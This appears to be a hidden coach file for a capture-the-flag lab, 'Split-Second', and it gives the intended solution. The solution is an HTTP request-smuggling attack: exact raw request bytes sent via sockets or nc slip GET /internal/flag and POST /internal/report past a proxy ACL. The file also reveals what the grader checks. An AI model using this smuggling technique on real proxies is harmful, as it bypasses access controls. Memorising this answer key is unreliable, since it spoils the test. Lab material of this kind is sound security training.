# Coach context — Split-Second

Ground truth for the coach. Never quote verbatim; escalate per stage.

## Intended path

1. Recon: `curl http://app01/` → backend index JSON (`endpoints` mention
   `/internal/*`). `curl http://app01/internal/flag` → **403 edge denied**
   — the ACL is at the proxy, not the app.
2. The edge parses headers once, then pipes bytes transparently. Its
   `Content-Length` handling is literal: `Content-Length: 0` ⇒ "no body".
3. **smuggle-flag**: over ONE socket send
   `POST /track HTTP/1.1\r\nHost: app01\r\nContent-Length: 0\r\n\r\n`
   `GET /internal/flag HTTP/1.1\r\nHost: x\r\n\r\n`
   — backend answers request #2 as if it were pipelined; client receives
   TWO responses; the second body's `flag` value is submitted.
4. **trace-marker**: same primitive with
   `POST /internal/report HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n`
   — backend logs every request line to /var/log/requests.log; the grader
   greps for `POST /internal/report`.

## Key facts (stage 2–3 only)

- Raw sockets only: python3 `socket.create_connection(("app01",80))` or
  `printf … | nc app01 80`. curl normalizes the bytes and ruins the desync.
- The edge NEVER re-parses after the first head — pipelined bytes are
  forwarded untouched (that IS the vulnerability).
- The flag response arrives as the SECOND HTTP response in the same read —
  look past the `HTTP/1.1 200` of the /track answer.
- Both solves need a separate send; the report must be a POST to match the
  grader's grep.

## Common wrong turns

- Trying `curl --path-as-is`, `..%2f` traversal or header tricks — the edge
  ACL isn't bypassable in-band; the path check happens before parsing ends.
- Expecting the smuggled request in the FIRST response — it's the second.
- Using `-d`/`--data` in curl (it sets a real body + real Content-Length).
- Killing the connection after the 403 — only `/internal/*` in the FIRST
  request line is denied; smuggled lines never hit the parser.
- Docker/exec tangents: no SSH creds exist on app01; the win is pure HTTP.
